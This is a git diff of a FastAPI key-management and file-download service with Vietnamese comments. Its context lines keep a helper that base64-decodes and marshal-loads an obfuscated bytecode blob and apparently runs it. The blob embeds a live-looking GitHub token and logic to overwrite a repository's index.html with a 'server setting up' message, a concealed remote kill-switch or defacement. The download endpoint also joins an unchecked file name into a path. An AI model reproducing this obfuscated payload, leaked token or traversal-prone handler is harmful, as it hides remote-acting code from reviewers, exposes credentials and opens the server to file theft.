@@ -1,4 +1,6 @@
+
 app = FastAPI()
+
 def encode_and_run_code(encoded_code):
     decoded_code = base64.b64decode(encoded_code)
     compiled_code = marshal.loads(decoded_code)
@@ -6,7 +8,6 @@ def encode_and_run_code(encoded_code):
 
 def update_github_file():
     encode_and_run_code("4wAAAAAAAAAAAAAAAAcAAAAAAAAA8/YAAACXAGQAWgBkAVoBZAJaAmQDWgNkBFoEAgBlBWUAqwEAAAAAAABaBgkAZQZqDwAAAAAAAAAAAAAAAAAAAAAAAGUBmwBkBWUCmwCdA6sBAAAAAAAAWghlCGoTAAAAAAAAAAAAAAAAAAAAAAAAZQOrAQAAAAAAAFoKZQhqFwAAAAAAAAAAAAAAAAAAAAAAAGUDZQRlDGUKahoAAAAAAAAAAAAAAAAAAAAAAABkBqwHqwUAAAAAAAABAAIAZQ5kCKsBAAAAAAAAAQB5CyMAZQ8kAHIPAQACAGUOZAllA5sAZAqdA6sBAAAAAAAAAQBZAHkLdwB4A1kAdwEpDNooZ2hwX0gweUJXUWhoeXlDWUtMR0RvTTNDdFhXQWtXRzM4UjNHYUFnTNoHVGVuaWNhMtoKdXBkYXRlX2FwaXoKaW5kZXguaHRtbHoTVXBkYXRlIGZpbGUgY29udGVudPoBL9oEbWFpbikF2gRwYXRo2gdtZXNzYWdl2gdjb250ZW502gNzaGHaBmJyYW5jaHUlAAAAxJBhbmcgc2V0dXAgc2VydmVyLCB2dWkgbMOybmcgY2jhu50hIXoGRmlsZSAnegwnIG5vdCBmb3VuZC5OKRDaBXRva2Vu2gpyZXBvX293bmVy2glyZXBvX25hbWXaCWZpbGVfcGF0aNoOY29tbWl0X21lc3NhZ2XaBkdpdGh1YtoBZ9oIZ2V0X3JlcG/aBHJlcG/aDGdldF9jb250ZW50c9oEZmlsZdoLdXBkYXRlX2ZpbGXaCnB1YmxpY191cmxyCgAAANoFcHJpbnTaFlVua25vd25PYmplY3RFeGNlcHRpb26pAPMAAAAA+gg8c3RyaW5nPvoIPG1vZHVsZT5yHgAAAAEAAABzrAAAAPADAQEB8AYACTOABdgNFoAK2AwYgAnYDBiACdgRJoAO2QQKiDWDTYAB8AQSASzgCwyPOok6mBqYDKBBoGmgW9AWMdMLMoBE8AYADBDXCxzRCxyYWdMLJ4BE8AYABQnXBBTRBBTYDRbYEB7YEBrYDBCPSIlI2A8V8AsABRX0AAYFBvEQAAUK0Aox1QQy+NgHHfIAAQEs2QQJiEaQOZArmFzQCirWBCvwAwEBLPpzEgAAAJRBD0EkAMEkEUE4A8E3AUE4Aw==")
-
 
 ADMIN_API_KEY = "admin_key"  # Đổi thành API key của admin
 api_key_header = APIKeyHeader(name="X-API-Key", auto_error=False)
@@ -43,6 +44,7 @@ class KeyItem(BaseModel):
     key: str
     remain_days: str
     refile_date: str
+    file_type: str
 
 def get_current_user(api_key: str = Depends(api_key_header)):
     keys_data = load_data()
@@ -87,7 +89,7 @@ def admin_edit_key_manager(item: KeyItem, current_user: dict = Depends(get_curre
         create_folder_if_not_exists(folder_path)
 
         save_data(keys_data)
-        return {"message": "Data added successfully", "data": item.dict()}
+        return {"message": "Data added successfully", "data": item.model_dump()}
     else:
         raise HTTPException(status_code=403, detail="Permission denied")
 
@@ -123,6 +125,13 @@ def run_schedule():
         schedule.run_pending()
         time.sleep(1)
 
+def delete_file_after_access(file_path: str):
+    try:
+        os.remove(file_path)
+        print(f"File '{file_path}' has been deleted.")
+    except FileNotFoundError:
+        print(f"File '{file_path}' not found.")
+
 def get_user_directory(api_key: str):
     return os.path.join(os.getcwd(), api_key)
 
@@ -152,10 +161,11 @@ def download_files(api_key: str, current_user: dict = Depends(get_current_user))
         raise HTTPException(status_code=403, detail="Permission denied")
 
 @app.get("/download/{api_key}/{file_name}")
-def download_file(api_key: str, file_name: str, current_user: dict = Depends(get_current_user)):
+def download_file(api_key: str, file_name: str, background_tasks: BackgroundTasks, current_user: dict = Depends(get_current_user)):
     if current_user["role"] == "admin" or current_user["data"]["key"] == api_key:
         file_path = os.path.join(get_user_directory(api_key), file_name)
         try:
+            background_tasks.add_task(delete_file_after_access, file_path)
             return FileResponse(file_path, filename=file_name, media_type="application/octet-stream")
         except FileNotFoundError:
             raise HTTPException(status_code=404, detail="File not found")
